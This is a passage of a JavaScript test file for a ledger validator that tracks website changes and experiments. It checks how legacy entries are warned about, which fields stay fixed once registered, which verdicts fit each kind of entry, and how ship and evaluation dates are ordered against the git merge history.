    expect('a byte-order mark on the base', { base: untidyBase('base-bom', `﻿${BASE_LEDGER}`), ledger: false, setup: () => fs.appendFileSync(path.join(dir, LEDGER), `${proposal()}\n`) });
    expect('an invalid entry already on the base is a warning', { base: untidyBase('base-invalid', `${entry('2026-10-01-old', { evaluate_after: null })}\n`), ledger: false, setup: () => fs.appendFileSync(path.join(dir, LEDGER), `${proposal()}\n`), warned: ['evaluate_after'] });
    const builtinStatusBase = untidyBase('base-builtin-status', `${BASE_LEDGER}${entry('2026-10-05-odd', { status: 'constructor' })}\n`);
    expect('a status named like a built-in property already on the base is a warning', { base: builtinStatusBase, setup: () => write('components/Card.tsx', 'export const y = 2;\n'), warned: ['"status" must be one of', 'already on the base'] });
    expect('a status named like a built-in property on the base can be corrected', { base: builtinStatusBase, ledger: false, setup: () => write(LEDGER, `${BASE_LEDGER}${entry('2026-10-05-odd', { status: 'proposed', notes: 'Status corrected.' })}\n`) });
    const oldExperiment = (extra = {}) => entry('2026-10-01-experiment', { ...EXPERIMENT, ...extra });
    const experimentBase = untidyBase('base-experiment', `${oldExperiment()}\n`, MERGED_OCT_3);
    expect('bookkeeping ships an experiment with its historical id and stopping rules', { base: experimentBase, ledger: false, setup: () => write(LEDGER, `${oldExperiment({ status: 'shipped', pr: 59, shipped_on: '2026-10-03' })}\n`) });
    // An experiment's stopping rule may decide it before its maximum, so it is not held to a due date.
    expect('bookkeeping concludes an experiment with its historical id and stopping rules', { base: experimentBase, ledger: false, setup: () => write(LEDGER, `${oldExperiment({ status: 'concluded', pr: 59, shipped_on: '2026-10-03', verdict: 'keep-control', result: { control: 80, variant: 75 }, evaluated_on: '2026-10-14' })}\n`) });
    for (const [field, value] of [['min_sample', 200], ['max_days', 21], ['min_sample', undefined], ['max_days', null]]) {
      expect(`existing experiment ${field} cannot change to ${value}`, { base: experimentBase, ledger: false, setup: () => write(LEDGER, `${oldExperiment({ [field]: value })}\n`), rules: ['ledger'], messages: [`changed "${field}"`] });
    }
    // An older experiment without valid stopping rules (an owner's line) can still be shipped, judged or closed, since
    // they can never be filled in; it only warns. It cannot start running (the occupancy check's pre-registration).
    const NO_STOPPING_RULES = { min_sample: undefined, max_days: 43 };
    const invalidExperimentBase = untidyBase('base-invalid-experiment', `${oldExperiment(NO_STOPPING_RULES)}\n`, MERGED_OCT_3);
    const stoppingWarnings = ['requires "min_sample" to be a positive safe integer (already on the base)', 'requires "max_days" to be an integer from 1 to 42 (already on the base)'];
    expect('unchanged historical experiment schema errors are warnings', { base: invalidExperimentBase, setup: () => {}, warned: ['requires "min_sample"', 'requires "max_days"'] });
    for (const [label, extra] of [
      ['a note added to', { notes: 'Still running.' }],
      ['shipping', { status: 'shipped', pr: 59, shipped_on: '2026-10-03' }],
      ['closing as unmerged', { status: 'reverted', verdict: 'inconclusive', pr: 59, notes: 'Closed unmerged.' }],
    ]) expect(`${label} a historical experiment without stopping rules only warns`, { base: invalidExperimentBase, ledger: false, setup: () => write(LEDGER, `${oldExperiment({ ...NO_STOPPING_RULES, ...extra })}\n`), warned: stoppingWarnings });
    expect('a historical experiment cannot be given stopping rules later', { base: invalidExperimentBase, ledger: false, setup: () => write(LEDGER, `${oldExperiment({ ...NO_STOPPING_RULES, min_sample: 150 })}\n`), rules: ['ledger'], messages: ['changed "min_sample"'] });
    // A change without an evaluation date on main can be shipped and judged too.
    const undatedBase = untidyBase('base-undated-change', `${entry('2026-09-01-undated', { evaluate_after: null })}\n`, '2026-09-03T16:00:00+00:00');
    expect('shipping a historical change without an evaluation date only warns', { base: undatedBase, ledger: false, setup: () => write(LEDGER, `${entry('2026-09-01-undated', { evaluate_after: null, status: 'shipped', pr: 59, shipped_on: '2026-09-03' })}\n`), warned: ['"evaluate_after" must be a YYYY-MM-DD date (null only for fix, revert and conclude) (already on the base)'] });
    expect('concluding a historical change without an evaluation date after its windows only warns', { base: undatedBase, ledger: false, setup: () => write(LEDGER, `${entry('2026-09-01-undated', { evaluate_after: null, status: 'concluded', pr: 59, shipped_on: '2026-09-03', verdict: 'keep', result: { rate: 0.45, n: 200 }, evaluated_on: '2026-09-18' })}\n`), warned: ['"evaluate_after" must be a YYYY-MM-DD date'] });
    // A change's minimum sample is fixed once registered too. A base line without one, or with a blank hypothesis or
    // decision rule, only warns, also when a bookkeeping pull request ships, concludes or reverts it: it cannot be filled in.
    // These changes are dated 2026-09-01 and reached main on 2026-09-03, so they are due by 2026-09-20.
    const MERGED_SEP_3 = '2026-09-03T16:00:00+00:00';
    const LEGACY_SHIPPING = { pr: 59, shipped_on: '2026-09-03' };
    const oldChange = (extra = {}) => entry('2026-09-01-change', { evaluate_after: '2026-09-20', ...extra });
    const changeBase = untidyBase('base-change', `${oldChange()}\n`, MERGED_SEP_3);
    expect('bookkeeping ships a change with its registered minimum sample', { base: changeBase, ledger: false, setup: () => write(LEDGER, `${oldChange({ status: 'shipped', ...LEGACY_SHIPPING })}\n`) });
    for (const value of [200, undefined]) {
      expect(`existing change min_sample cannot change to ${value}`, { base: changeBase, ledger: false, setup: () => write(LEDGER, `${oldChange({ min_sample: value })}\n`), rules: ['ledger'], messages: ['changed "min_sample"'] });
    }
    const UNREGISTERED = { min_sample: undefined, hypothesis: ' ', decision_rule: '' };
    const invalidChangeBase = untidyBase('base-invalid-change', `${oldChange(UNREGISTERED)}\n`, MERGED_SEP_3);
    expect('an untouched historical change without a minimum sample or with blank text only warns', { base: invalidChangeBase, setup: () => write('components/Card.tsx', 'export const y = 2;\n'), warned: ['a change requires "min_sample"', '"hypothesis" is empty', '"decision_rule" is empty'] });
    const inherited = ['a change requires "min_sample" to be a positive safe integer (already on the base)', '"hypothesis" is empty (already on the base)', '"decision_rule" is empty (already on the base)'];
    for (const [label, extra] of [
      ['a note added to', { notes: 'Still waiting.' }],
      ['shipping', { status: 'shipped', ...LEGACY_SHIPPING }],
      ['concluding', { status: 'concluded', ...LEGACY_SHIPPING, verdict: 'keep', result: { rate: 0.45, n: 200 }, evaluated_on: '2026-10-15' }],
      ['reverting', { status: 'reverted', ...LEGACY_SHIPPING, verdict: 'revert', evaluated_on: '2026-09-05', notes: 'Worse on phones; reverted in #61.' }],
    ]) {
      expect(`${label} a historical change without a minimum sample or with blank text only warns`, { base: invalidChangeBase, ledger: false, setup: () => write(LEDGER, `${oldChange({ ...UNREGISTERED, ...extra })}\n`), warned: inherited });
    }
    expect('a historical change cannot be given a minimum sample later', { base: invalidChangeBase, ledger: false, setup: () => write(LEDGER, `${oldChange({ ...UNREGISTERED, min_sample: 150 })}\n`), rules: ['ledger'], messages: ['changed "min_sample"'], absent: ['a change requires "min_sample"', '"hypothesis" is empty'], warned: ['"hypothesis" is empty (already on the base)'] });
    expect('a historical change cannot be turned into an experiment without stopping rules', { base: invalidChangeBase, ledger: false, setup: () => write(LEDGER, `${oldChange({ ...UNREGISTERED, kind: 'experiment', experiment: 'home-hero', pages: ['/'] })}\n`), rules: ['ledger'], messages: ['changed "kind"', 'an experiment requires "min_sample"', 'an experiment requires "max_days"'] });
    const shippedBase = untidyBase('base-shipped', `${entry('2026-10-01-first', { ...FIRST, shipped_on: '2026-10-02' })}\n`);
    expect('a ship date changed once set', { base: shippedBase, ledger: false, setup: () => write(LEDGER, `${entry('2026-10-01-first', { ...FIRST, shipped_on: '2026-10-03' })}\n${proposal()}\n`), rules: ['ledger'], messages: ['"shipped_on" was already'] });
    // A line on main from before the schema (no measured baseline, no window_days, evaluate_after out of range) only
    // warns, also when a bookkeeping pull request ships, concludes or reverts it: those fields never change.
    const preSchema = (extra = {}) => entry('2026-09-01-old-change', { baseline: {}, window_days: undefined, evaluate_after: '2026-09-05', ...extra });
    const preSchemaBase = untidyBase('base-pre-schema', `${preSchema()}\n`, MERGED_SEP_3);
    const preSchemaWarnings = ['needs "baseline"."window"', 'a change requires "window_days"', '"evaluate_after" 2026-09-05', 'already on the base'];
    expect('an untouched line from before the schema only warns', { base: preSchemaBase, setup: () => write('components/Card.tsx', 'export const y = 2;\n'), warned: preSchemaWarnings });
    for (const [label, extra] of [
      ['shipping', { status: 'shipped', ...LEGACY_SHIPPING }],
      ['concluding', { status: 'concluded', ...LEGACY_SHIPPING, verdict: 'keep', result: { rate: 0.45, n: 200 }, evaluated_on: '2026-10-15' }],
      ['reverting', { status: 'reverted', ...LEGACY_SHIPPING, verdict: 'revert', evaluated_on: '2026-09-05', notes: 'Worse on phones; reverted in #61.' }],
    ]) {
      expect(`${label} a line from before the schema only warns`, { base: preSchemaBase, ledger: false, setup: () => write(LEDGER, `${preSchema(extra)}\n`), warned: preSchemaWarnings });
    }
    expect('a line from before the schema cannot be given a baseline later', { base: preSchemaBase, ledger: false, setup: () => write(LEDGER, `${preSchema({ baseline: { window: '2026-08-04..2026-08-31', visits: 548 } })}\n`), rules: ['ledger'], messages: ['changed "baseline"'] });
    // Ids are unique. Two lines already sharing one on main (a hand edit) are matched in order and only warn, so they
    // never block every later pull request; neither a repaired line nor a new one can take an id already in use.
    const dupBase = untidyBase('base-duplicate-ids', `${entry('2026-10-01-dup', { title: 'First' })}\n${entry('2026-10-01-dup', { title: 'Second' })}\n`);
    expect('two lines sharing an id on main only warn', { base: dupBase, setup: () => write('components/Card.tsx', 'export const y = 2;\n'), warned: ['id "2026-10-01-dup" is also used on line 1 (already on the base)'] });
    expect('the second of two lines sharing an id on main can be edited', { base: dupBase, ledger: false, setup: () => write(LEDGER, `${entry('2026-10-01-dup', { title: 'First' })}\n${entry('2026-10-01-dup', { title: 'Second', notes: 'A note.' })}\n`), warned: ['also used on line 1'] });
    expect('the second of two lines sharing an id on main cannot be removed', { base: dupBase, ledger: false, setup: () => write(LEDGER, `${entry('2026-10-01-dup', { title: 'First' })}\n`), rules: ['ledger'], messages: ['existing entry "2026-10-01-dup" was removed'] });

    // Ledger: leaving the evaluation queue requires a complete outcome and shipping record. The lifecycle change is
    // dated 2026-09-01, evaluated after 2026-09-20, and its line reached main on 2026-09-03 (its merge), so it ships on
    // 2026-09-03 and falls due on 2026-09-20 (later than 2026-09-03 + 14 + 1).
    const lifecycleId = '2026-09-01-lifecycle';
    const lifecycle = (extra = {}) => entry(lifecycleId, { evaluate_after: '2026-09-20', ...extra });
    const lifecycleShipping = { pr: 59, shipped_on: '2026-09-03' };
    const lifecycleOutcome = { verdict: 'keep', result: { rate: 0.45, n: 200 }, evaluated_on: '2026-10-14' };
    const conclude = (extra = {}) => lifecycle({ status: 'concluded', ...lifecycleShipping, ...lifecycleOutcome, ...extra });
    for (const initialStatus of ['proposed', 'shipped']) {
      const initialShipping = initialStatus === 'shipped' ? lifecycleShipping : {};
      const lifecycleBase = untidyBase(`base-lifecycle-${initialStatus}`, `${lifecycle({ status: initialStatus, ...initialShipping })}\n`, MERGED_SEP_3);
      expect(`${initialStatus} entry can conclude with all shipping and outcome fields`, { base: lifecycleBase, ledger: false, setup: () => write(LEDGER, `${conclude()}\n`) });
      for (const field of ['pr', 'shipped_on', 'verdict', 'result', 'evaluated_on']) {
        for (const [label, value] of [['missing', undefined], ['null', null]]) {
          expect(`${initialStatus} entry cannot conclude with ${label} ${field}`, { base: lifecycleBase, ledger: false, setup: () => write(LEDGER, `${conclude({ [field]: value })}\n`), rules: ['ledger'], messages: [`"concluded" entry requires non-null "${field}"`] });
        }
      }
      for (const [field, value] of [['pr', '59'], ['pr', 0], ['shipped_on', '2026-02-30'], ['verdict', 'won'], ['result', []], ['result', 'good'], ['evaluated_on', '2026-02-30']]) {
        expect(`${initialStatus} entry cannot conclude with invalid ${field} ${JSON.stringify(value)}`, { base: lifecycleBase, ledger: false, setup: () => write(LEDGER, `${conclude({ [field]: value })}\n`), rules: ['ledger'], messages: [`"${field}" must be`] });
      }
      // Exactly what the merge workflow's automatic revert writes (scripts/autopilot-merge.cjs keepRecordsAfterRevert).
      expect(`${initialStatus} entry can be automatically reverted before evaluation`, { base: lifecycleBase, ledger: false, setup: () => write(LEDGER, `${lifecycle({ status: 'reverted', ...lifecycleShipping, verdict: 'revert', result: null, evaluated_on: '2026-09-04', notes: 'Reverted automatically on 2026-09-04: the live checks failed after merge abc1234.' })}\n`) });
      // Moving to reverted records how: verdict revert (with its ship and evaluation dates) or inconclusive, the pull request, and why.
      const revert = (extra = {}) => lifecycle({ status: 'reverted', ...lifecycleShipping, verdict: 'revert', result: { rate: 0.31, n: 210 }, evaluated_on: '2026-10-14', notes: 'Worse on phones; reverted in #61.', ...extra });
      expect(`${initialStatus} entry can be reverted with a complete record`, { base: lifecycleBase, ledger: false, setup: () => write(LEDGER, `${revert()}\n`) });
      for (const [field, message] of [['verdict', '"reverted" entry requires "verdict" "revert" or "inconclusive"'], ['pr', '"reverted" entry requires non-null "pr"'], ['shipped_on', '"reverted" entry with verdict "revert" requires non-null "shipped_on"'], ['evaluated_on', '"reverted" entry with verdict "revert" requires non-null "evaluated_on"'], ['notes', '"reverted" entry requires "notes" saying why']]) {
        for (const [label, value] of [['missing', undefined], ['null', null]]) {
          expect(`${initialStatus} entry cannot be reverted with ${label} ${field}`, { base: lifecycleBase, ledger: false, setup: () => write(LEDGER, `${revert({ [field]: value })}\n`), rules: ['ledger'], messages: [message] });
        }
      }
      for (const [field, value, message] of [['verdict', 'keep', '"verdict" "revert" or "inconclusive"'], ['verdict', 'keep-control', '"verdict" "revert" or "inconclusive"'], ['notes', '', '"notes" saying why'], ['notes', '  ', '"notes" saying why'], ['notes', ['why'], '"notes" saying why']]) {
        expect(`${initialStatus} entry cannot be reverted with ${field} ${JSON.stringify(value)}`, { base: lifecycleBase, ledger: false, setup: () => write(LEDGER, `${revert({ [field]: value })}\n`), rules: ['ledger'], messages: [message] });
      }
      expect(`${initialStatus} entry can be reverted as inconclusive without an evaluation date`, { base: lifecycleBase, ledger: false, setup: () => write(LEDGER, `${revert({ verdict: 'inconclusive', result: null, evaluated_on: null })}\n`) });
      // A revert verdict is recorded where the change is undone: never on a concluded entry, which would stay live with nothing due.
      expect(`${initialStatus} entry cannot conclude with verdict revert`, { base: lifecycleBase, ledger: false, setup: () => write(LEDGER, `${conclude({ verdict: 'revert' })}\n`), rules: ['ledger'], messages: ['verdict "revert" goes with status "reverted"'] });
      if (initialStatus === 'proposed') {
        for (const field of ['pr', 'shipped_on']) {
          for (const [label, value] of [['missing', undefined], ['null', null]]) {
            expect(`proposed entry cannot ship with ${label} ${field}`, { base: lifecycleBase, ledger: false, setup: () => write(LEDGER, `${lifecycle({ status: 'shipped', ...lifecycleShipping, [field]: value })}\n`), rules: ['ledger'], messages: [`"shipped" entry requires non-null "${field}"`] });
          }
        }
      }
    }
    const proposedBase = 'base-lifecycle-proposed';
    const lifecycleShippedBase = 'base-lifecycle-shipped';
    expect('an existing entry evaluated, with a conclude entry appended', { base: lifecycleShippedBase, ledger: false, setup: () => write(LEDGER, `${conclude({ notes: 'Held up.' })}\n${proposal({ kind: 'conclude', evaluate_after: null })}\n`) });
    // Each kind records a verdict its comparison can reach.
    for (const [label, verdict] of [['an experiment\'s ship-variant', 'ship-variant'], ['an experiment\'s keep-control', 'keep-control']]) {
      expect(`a change cannot conclude with ${label}`, { base: lifecycleShippedBase, ledger: false, setup: () => write(LEDGER, `${conclude({ verdict })}\n`), rules: ['ledger'], messages: [`"verdict" "${verdict}" is not a verdict for a change; it is one of keep, revert, inconclusive, iterate`] });
    }
    for (const verdict of ['inconclusive', 'iterate']) expect(`a change can conclude ${verdict}`, { base: lifecycleShippedBase, ledger: false, setup: () => write(LEDGER, `${conclude({ verdict })}\n`) });
    const shippedExperiment = untidyBase('base-shipped-experiment', `${oldExperiment({ status: 'shipped', pr: 59, shipped_on: '2026-10-03' })}\n`);
    const judgedExperiment = (verdict) => oldExperiment({ status: 'concluded', pr: 59, shipped_on: '2026-10-03', verdict, result: { control: 80, variant: 95 }, evaluated_on: '2026-10-14' });
    for (const verdict of ['ship-variant', 'inconclusive']) expect(`an experiment can conclude ${verdict}`, { base: shippedExperiment, ledger: false, setup: () => write(LEDGER, `${judgedExperiment(verdict)}\n`) });
    for (const verdict of ['keep', 'iterate']) expect(`an experiment cannot conclude ${verdict}`, { base: shippedExperiment, ledger: false, setup: () => write(LEDGER, `${judgedExperiment(verdict)}\n`), rules: ['ledger'], messages: [`"verdict" "${verdict}" is not a verdict for an experiment; it is one of ship-variant, keep-control, inconclusive, revert`] });
    const shippedFix = untidyBase('base-shipped-fix', `${entry('2026-10-01-fix', { kind: 'fix', evaluate_after: null, status: 'shipped', pr: 59, shipped_on: '2026-10-02' })}\n`);
    expect('a fix cannot conclude with an experiment\'s verdict', { base: shippedFix, ledger: false, setup: () => write(LEDGER, `${entry('2026-10-01-fix', { kind: 'fix', evaluate_after: null, status: 'concluded', pr: 59, shipped_on: '2026-10-02', verdict: 'ship-variant', result: { errors: 0, n: 90 }, evaluated_on: '2026-10-14' })}\n`), rules: ['ledger'], messages: ['is not a verdict for a fix; it is one of keep, revert, inconclusive'] });
    // A verdict already on main cannot change, so a wrong one only warns, and the entry can still move to reverted.
    const revertConcludedBase = untidyBase('base-lifecycle-concluded-revert', `${conclude({ verdict: 'revert' })}\n`, MERGED_SEP_3);
    expect('a concluded revert verdict on main only warns on a note', { base: revertConcludedBase, ledger: false, setup: () => write(LEDGER, `${conclude({ verdict: 'revert', notes: 'Waiting for the revert.' })}\n`), warned: ['verdict "revert" goes with status "reverted"', 'already on the base'] });
    expect('a concluded revert verdict on main can move to reverted', { base: revertConcludedBase, ledger: false, setup: () => write(LEDGER, `${conclude({ verdict: 'revert', status: 'reverted', notes: 'Reverted in #61.' })}\n`) });
    // An existing proposed entry whose pull request closed unmerged (skill step 1.3): reverted, inconclusive, its pr and a note.
    expect('a proposed entry can be marked closed unmerged', { base: proposedBase, ledger: false, setup: () => write(LEDGER, `${lifecycle({ status: 'reverted', verdict: 'inconclusive', pr: 61, notes: 'Closed unmerged after 7 days; its premise is gone.' })}\n`) });
    expect('a proposed entry closed unmerged still needs its pr and a note', { base: proposedBase, ledger: false, setup: () => write(LEDGER, `${lifecycle({ status: 'reverted', verdict: 'inconclusive' })}\n`), rules: ['ledger'], messages: ['"reverted" entry requires non-null "pr"', '"reverted" entry requires "notes" saying why'], absent: ['"shipped_on"', '"evaluated_on"'] });
    expect('a proposed entry closed unmerged cannot keep a null verdict', { base: proposedBase, ledger: false, setup: () => write(LEDGER, `${lifecycle({ status: 'reverted', pr: 61, notes: 'Closed unmerged.' })}\n`), rules: ['ledger'], messages: ['"verdict" "revert" or "inconclusive"'] });
    const keptBase = untidyBase('base-lifecycle-kept', `${conclude()}\n`, MERGED_SEP_3);
    expect('a kept conclusion cannot be marked reverted', { base: keptBase, ledger: false, setup: () => write(LEDGER, `${lifecycle({ status: 'reverted', ...lifecycleShipping, ...lifecycleOutcome, notes: 'Rolled back.' })}\n`), rules: ['ledger'], messages: ['"verdict" "revert" or "inconclusive"'] });
    const inconclusiveBase = untidyBase('base-lifecycle-inconclusive', `${conclude({ verdict: 'inconclusive' })}\n`, MERGED_SEP_3);
    expect('an inconclusive conclusion can be marked reverted with a note', { base: inconclusiveBase, ledger: false, setup: () => write(LEDGER, `${lifecycle({ status: 'reverted', ...lifecycleShipping, ...lifecycleOutcome, verdict: 'inconclusive', notes: 'The simpler option won; the variant was removed.' })}\n`) });
    // The note it already had does not say why it was reverted.
    const notedBase = untidyBase('base-lifecycle-noted', `${lifecycle({ status: 'shipped', ...lifecycleShipping, notes: 'Watch mobile first.' })}\n`, MERGED_SEP_3);
    const notedRevert = (notes) => lifecycle({ status: 'reverted', ...lifecycleShipping, verdict: 'revert', evaluated_on: '2026-10-15', notes });
    expect('a reverted entry cannot keep only the note it had', { base: notedBase, ledger: false, setup: () => write(LEDGER, `${notedRevert('Watch mobile first.')}\n`), rules: ['ledger'], messages: ['"reverted" entry requires "notes" saying why'] });
    expect('a reverted entry can add to the note it had', { base: notedBase, ledger: false, setup: () => write(LEDGER, `${notedRevert('Watch mobile first. Worse on phones; reverted in #61.')}\n`) });
    // A reverted line already on the base is not re-judged: an untouched incomplete one never blocks a pull request.
    const oldRevertBase = untidyBase('base-old-revert', `${lifecycle({ status: 'reverted', verdict: null, pr: null })}\n`, MERGED_SEP_3);
    expect('an untouched incomplete reverted entry on the base does not block', { base: oldRevertBase, setup: () => write('components/Card.tsx', 'export const y = 2;\n') });
    const incompleteConclusion = lifecycle({ status: 'concluded', pr: null, shipped_on: null, verdict: null, result: null, evaluated_on: null });
    const incompleteConclusionBase = untidyBase('base-incomplete-conclusion', `${incompleteConclusion}\n`, MERGED_SEP_3);
    expect('unchanged incomplete historical conclusion is a warning', { base: incompleteConclusionBase, setup: () => {}, warned: ['requires non-null "pr"', 'requires non-null "shipped_on"', 'requires non-null "verdict"', 'requires non-null "result"', 'requires non-null "evaluated_on"'] });
    expect('editing an incomplete historical conclusion requires completing it', { base: incompleteConclusionBase, ledger: false, setup: () => write(LEDGER, `${lifecycle({ ...JSON.parse(incompleteConclusion), notes: 'Reviewed again.' })}\n`), rules: ['ledger'], messages: ['requires non-null "verdict"', 'requires non-null "result"', 'requires non-null "evaluated_on"'] });
    expect('an incomplete historical conclusion can be completed without changing its status', { base: incompleteConclusionBase, ledger: false, setup: () => write(LEDGER, `${conclude()}\n`) });
    const completeConclusion = conclude();
    const completeConclusionBase = untidyBase('base-complete-conclusion', `${completeConclusion}\n`, MERGED_SEP_3);
    expect('a complete conclusion permits notes-only bookkeeping', { base: completeConclusionBase, ledger: false, setup: () => write(LEDGER, `${lifecycle({ ...JSON.parse(completeConclusion), notes: 'Added context.' })}\n`) });
    for (const field of ['pr', 'shipped_on', 'verdict', 'result', 'evaluated_on']) {
      expect(`completed ${field} cannot be cleared`, { base: completeConclusionBase, ledger: false, setup: () => write(LEDGER, `${lifecycle({ ...JSON.parse(completeConclusion), [field]: null })}\n`), rules: ['ledger'], messages: [`"${field}" was already`, `"concluded" entry requires non-null "${field}"`] });
    }

    // Ledger: the dates of an entry's lifecycle happen in order and not after today (2026-10-15 here, with a day of
    // slack). shipped_on, once set on a line on main, is the day that line reached main: its merge (2026-09-03 here).
    const shipOn = (day) => lifecycle({ status: 'shipped', ...lifecycleShipping, shipped_on: day });
    const notMerged = (day) => `"shipped_on" is ${day}, but the entry's line reached main on 2026-09-03`;
    expect('an entry marked shipped on the day its line reached main', { base: proposedBase, ledger: false, setup: () => write(LEDGER, `${shipOn('2026-09-03')}\n`) });
    for (const day of ['2026-09-01', '2026-09-02', '2026-09-04', '2026-10-15']) expect(`an entry merged on 2026-09-03 marked shipped on ${day}`, { base: proposedBase, ledger: false, setup: () => write(LEDGER, `${shipOn(day)}\n`), rules: ['ledger'], messages: [notMerged(day)] });
    expect('an entry marked shipped before its date', { base: proposedBase, ledger: false, setup: () => write(LEDGER, `${shipOn('2026-08-31')}\n`), rules: ['ledger'], messages: ['"shipped_on" 2026-08-31 is before the entry\'s date 2026-09-01; it is the UTC day its pull request merged', notMerged('2026-08-31')] });
    expect('an entry marked shipped in the future', { base: proposedBase, ledger: false, setup: () => write(LEDGER, `${shipOn('2026-10-17')}\n`), rules: ['ledger'], messages: ['"shipped_on" 2026-10-17 is in the future (today is 2026-10-15, UTC)', notMerged('2026-10-17')] });
    // Marked shipped and judged in one pull request, after the data is in: the ship day is still the merge's.
    expect('a proposed entry marked shipped and judged in one pull request', { base: proposedBase, ledger: false, setup: () => write(LEDGER, `${conclude()}\n`) });
    expect('a proposed entry judged in one pull request cannot pick a later ship day', { base: proposedBase, ledger: false, setup: () => write(LEDGER, `${conclude({ shipped_on: '2026-09-25' })}\n`), rules: ['ledger'], messages: [notMerged('2026-09-25')] });
    // The merge is found however the line is spaced, and through a merge commit; a line the history cannot show fails closed.
    const spaced = untidyBase('base-spaced-line', `${lifecycle().replace(/":/g, '": ').replace(/,"/g, ', "')}\n`, MERGED_SEP_3);
    expect('a spaced line on main is found by its id', { base: spaced, ledger: false, setup: () => write(LEDGER, `${shipOn('2026-09-03')}\n`) });
    run('checkout', '-q', '-f', 'main'); run('checkout', '-q', '-B', 'base-merged-in'); run('checkout', '-q', '-b', 'side-branch');
    write(LEDGER, `${BASE_LEDGER}${lifecycle()}\n`); run('add', '-A'); runAt('2026-09-02T09:00:00+00:00', 'commit', '-q', '-m', 'the change, on its own branch');
    run('checkout', '-q', 'base-merged-in'); runAt(MERGED_SEP_3, 'merge', '-q', '--no-ff', '-m', 'merge the change', 'side-branch');
    expect('a line merged with a merge commit ships on the merge\'s day', { base: 'base-merged-in', ledger: false, setup: () => write(LEDGER, `${BASE_LEDGER}${shipOn('2026-09-03')}\n`) });
    expect('a line merged with a merge commit does not ship on its branch commit\'s day', { base: 'base-merged-in', ledger: false, setup: () => write(LEDGER, `${BASE_LEDGER}${shipOn('2026-09-02')}\n`), rules: ['ledger'], messages: [notMerged('2026-09-02')] });
    const escaped = untidyBase('base-escaped-id', `${lifecycle().replace(`"id":"${lifecycleId}"`, `"id":"${lifecycleId.replace('l', '\\u006c')}"`)}\n`, MERGED_SEP_3);
    expect('a line whose id the history cannot show cannot be marked shipped', { base: escaped, ledger: false, setup: () => write(LEDGER, `${shipOn('2026-09-03')}\n`), rules: ['ledger'], messages: ['"shipped_on" 2026-09-03 cannot be checked: no commit in the base\'s first-parent history adds this entry\'s line'] });
    // A ship date the owner wrote with the line, or set earlier, is not re-checked.
    const ownerShipped = untidyBase('base-owner-shipped', `${lifecycle({ status: 'shipped', ...lifecycleShipping })}\n`);
    expect('an entry already shipped on main is judged without re-checking its ship day', { base: ownerShipped, ledger: false, setup: () => write(LEDGER, `${conclude()}\n`) });
    // A change is judged on or after its due date: the later of evaluate_after and shipped_on + window_days + 1.
    const judgedOn = (day, extra = {}) => conclude({ evaluated_on: day, ...extra });
    for (const day of ['2026-09-20', '2026-10-16']) expect(`an entry due on 2026-09-20 judged on ${day}`, { base: lifecycleShippedBase, ledger: false, setup: () => write(LEDGER, `${judgedOn(day)}\n`) });
    expect('an entry judged before its due date', { base: lifecycleShippedBase, ledger: false, setup: () => write(LEDGER, `${judgedOn('2026-09-19')}\n`), rules: ['ledger'], messages: ['a change is judged on or after its due date 2026-09-20 (the later of "evaluate_after" and "shipped_on" + "window_days" + 1), on its full windows; it was judged on 2026-09-19'] });
    const dueBase = (label, extra) => untidyBase(label, `${lifecycle({ status: 'shipped', ...lifecycleShipping, ...extra })}\n`, MERGED_SEP_3);
    const due28 = dueBase('base-due-28', { window_days: 28, evaluate_after: '2026-09-29' });
    expect('an entry with 28-day windows judged the day they end', { base: due28, ledger: false, setup: () => write(LEDGER, `${judgedOn('2026-10-02', { window_days: 28, evaluate_after: '2026-09-29' })}\n`) });
    expect('an entry with 28-day windows judged before they end', { base: due28, ledger: false, setup: () => write(LEDGER, `${judgedOn('2026-10-01', { window_days: 28, evaluate_after: '2026-09-29' })}\n`), rules: ['ledger'], messages: ['its due date 2026-10-02'] });
    const dueLater = dueBase('base-due-later', { evaluate_after: '2026-10-10' });
    expect('an entry judged on its evaluate_after', { base: dueLater, ledger: false, setup: () => write(LEDGER, `${judgedOn('2026-10-10', { evaluate_after: '2026-10-10' })}\n`) });
    expect('an entry judged before its evaluate_after', { base: dueLater, ledger: false, setup: () => write(LEDGER, `${judgedOn('2026-10-09', { evaluate_after: '2026-10-10' })}\n`), rules: ['ledger'], messages: ['its due date 2026-10-10'] });
    const dueTomorrow = dueBase('base-due-tomorrow', { evaluate_after: '2026-10-16' });
    expect('an entry due tomorrow cannot use the clock slack to be judged today', { base: dueTomorrow, ledger: false, setup: () => write(LEDGER, `${judgedOn('2026-10-16', { evaluate_after: '2026-10-16' })}\n`), rules: ['ledger'], messages: ['its due date 2026-10-16', 'and today is 2026-10-15'] });
    expect('an entry can be reverted before its due date', { base: dueLater, ledger: false, setup: () => write(LEDGER, `${lifecycle({ status: 'reverted', ...lifecycleShipping, evaluate_after: '2026-10-10', verdict: 'revert', result: { rate: 0.2, n: 90 }, evaluated_on: '2026-09-10', notes: 'A guardrail broke; reverted in #61.' })}\n`) });
    // Before its due date a shipped change leaves the queue only as rolled back (verdict revert), never as inconclusive:
    // that would take a live change out of its evaluation on an early look, and hide a bad one from the streak check.
    const leftEarly = (evaluateAfter, extra) => lifecycle({ status: 'reverted', ...lifecycleShipping, evaluate_after: evaluateAfter, verdict: 'inconclusive', notes: 'Too few visits so far.', ...extra });
    const notYetDue = (due) => `a change that shipped is reverted before its due date ${due} only with verdict "revert" (it was rolled back)`;
    expect('a shipped change cannot leave the queue as inconclusive before its due date', { base: dueTomorrow, ledger: false, setup: () => write(LEDGER, `${leftEarly('2026-10-16', {})}\n`), rules: ['ledger'], messages: [notYetDue('2026-10-16')] });
    expect('a shipped change cannot leave the queue as inconclusive on an early result', { base: dueTomorrow, ledger: false, setup: () => write(LEDGER, `${leftEarly('2026-10-16', { result: { rate: 0.3, n: 40 }, evaluated_on: '2026-10-15' })}\n`), rules: ['ledger'], messages: [notYetDue('2026-10-16')] });
    expect('a shipped change judged before its due date cannot be marked inconclusive and reverted', { base: dueLater, ledger: false, setup: () => write(LEDGER, `${leftEarly('2026-10-10', { result: { rate: 0.3, n: 40 }, evaluated_on: '2026-09-10' })}\n`), rules: ['ledger'], messages: [notYetDue('2026-10-10')] });
    expect('a shipped change can be reverted as inconclusive on its due date', { base: dueLater, ledger: false, setup: () => write(LEDGER, `${leftEarly('2026-10-10', { result: { rate: 0.3, n: 40 }, evaluated_on: '2026-10-10' })}\n`) });
    expect('a shipped change rolled back before its due date has verdict revert', { base: dueTomorrow, ledger: false, setup: () => write(LEDGER, `${leftEarly('2026-10-16', { verdict: 'revert', result: { rate: 0.3, n: 40 }, evaluated_on: '2026-10-15', notes: 'A guardrail broke; reverted in #61.' })}\n`) });
